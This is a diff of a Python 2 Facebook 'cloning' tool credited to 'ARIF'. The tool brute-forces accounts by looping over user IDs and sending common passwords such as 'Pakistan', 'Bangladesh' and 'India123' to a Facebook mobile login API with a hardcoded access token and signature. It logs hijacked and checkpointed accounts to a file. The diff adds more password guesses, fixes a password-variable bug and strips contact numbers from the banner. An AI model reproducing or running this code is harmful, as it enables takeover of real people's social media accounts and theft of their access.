@@ -96,16 +96,8 @@ print  """
 \033[1;94m•◈••◈••◈•\033[1;95m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈••◈•\033[1;94m••◈••◈••◈••◈••◈••◈••◈••◈•\033[1;94m•◈••◈••◈••◈•
 \033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
-jalan('\033[1;95m▬10%')
-jalan("\033[1;95m▬▬20%")
-jalan('\033[1;95m▬▬▬30%')
-jalan('\033[1;95m▬▬▬▬40%')
-jalan("\033[1;95m▬▬▬▬▬50%")
-jalan("\033[1;95m▬▬▬▬▬▬60%")
-jalan('\033[1;95m▬▬▬▬▬▬▬70%')
-jalan('\033[1;95m▬▬▬▬▬▬▬▬80%')
-jalan('\033[1;95m▬▬▬▬▬▬▬▬▬90%')
-jalan('\033[1;95m▬▬▬▬▬▬▬▬▬100%')
+jalan('\033[1;95mWelcome To My Cloning Tools')
+
 print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
 
@@ -149,7 +141,7 @@ def login():
 		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword\x1b[1;96m: \x1b[1;93m')
 		tik()
 		try:
-			br.open('https://www.facebook.com')
+			br.open('https://mbasic.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;96mThere is no internet connection"
 			keluar()
@@ -420,7 +412,7 @@ def pilih_super():
 																	cekpoint.append(user+pass7)
 	
 			pass8 = ('786786')
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
 				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
@@ -432,6 +424,47 @@ def pilih_super():
 					cek.write(user+"|"+pass8+"\n")
 					cek.close()
 					cekpoint.append(user+pass8)
+
+			pass9 = ('Pakistan')
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
+				oks.append(user+pass9)
+			else:
+				if 'www.facebook.com' in q["error_msg"]:
+					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
+					cek = open("out/super_cp.txt", "a")
+					cek.write(user+"|"+pass9+"\n")
+					cek.close()
+					cekpoint.append(user+pass9)
+			pass10 = ('Bangladesh')
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+				oks.append(user+pass10)
+			else:
+				if 'www.facebook.com' in q["error_msg"]:
+					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+					cek = open("out/super_cp.txt", "a")
+					cek.write(user+"|"+pass10+"\n")
+					cek.close()
+					cekpoint.append(user+pass10)
+			pass11 = ('India123')
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
+				oks.append(user+pass11)
+			else:
+				if 'www.facebook.com' in q["error_msg"]:
+					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
+					cek = open("out/super_cp.txt", "a")
+					cek.write(user+"|"+pass11+"\n")
+					cek.close()
+					cekpoint.append(user+pass11)
+
 				
 		except:
 			pass
@@ -440,21 +473,21 @@ def pilih_super():
 	p.map(main, id)
 	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 	print "  \033[1;93m«---•◈•---Developed By ARIF--•◈•---»" #Dev:ARIF
-	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;92m....'
+	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 arif.py)↩\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
              
              ╔══╗░░░░╔╦╗░░╔═════╗    
-             ║╚═╬════╬╣╠═╗║░▀░▀░║    ARIFUL ISLAM
-             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    WhatsApp
-             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    01721919797
+             ║╚═╬════╬╣╠═╗║░▀░▀░║    
+             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    ARIFUL ISLAM
+             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    
              Checkpoint ID Open After 7 Days
 
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
 : \033[1;93m .....  ARIF....... \033[1;91m :
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;93m +923094161457"""
+                
+              \033[1;93m """
 	
 	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
 	menu()
